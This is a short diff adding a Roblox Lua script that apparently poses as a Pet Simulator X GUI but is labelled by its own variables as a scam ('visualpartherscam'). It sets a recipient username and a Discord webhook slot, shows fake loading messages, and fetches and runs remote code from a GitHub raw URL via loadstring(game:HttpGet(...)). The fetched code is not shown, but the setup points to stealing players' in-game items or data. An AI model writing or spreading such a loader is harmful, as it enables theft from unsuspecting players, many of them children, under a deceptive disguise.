@@ -1,0 +1,9 @@
+Username = "Drippisamathbook" ---key do not delete
+WebHook = "" ---link to discord server do not delete
+loadingscreen = true
+_G.CustomScriptName = "visualpartherscam"
+_G.Text1 = "loading script…"
+_G.Text2 = "loading…"
+_G.Text3 = "loading in gui…"
+_G.Text4 = "gui loaded wait…"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
